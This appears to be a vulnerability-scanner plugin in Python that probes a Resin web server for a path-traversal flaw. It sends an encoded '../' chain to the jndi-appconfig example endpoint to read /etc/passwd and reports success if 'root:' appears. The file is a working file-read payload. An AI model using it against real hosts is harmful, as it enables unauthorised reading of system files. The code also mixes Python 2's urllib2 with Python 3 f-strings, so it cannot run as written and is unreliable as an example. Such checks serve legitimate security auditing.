#coding:utf-8
#author:wolf@future-sec
import urllib2
def check(host,port,timeout):
    url = "http://%s:%d"%(host,int(port))
    vul_url = f"{url}/resin-doc/examples/jndi-appconfig/test?inputFile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"

    try:
        res_html = urllib2.urlopen(vul_url,timeout=timeout).read()
    except:
        return 'NO'
    if "root:" in res_html:
        info = f"{vul_url} Resin File Read Vul"
        return f'YES|{info}'
    return 'NO'
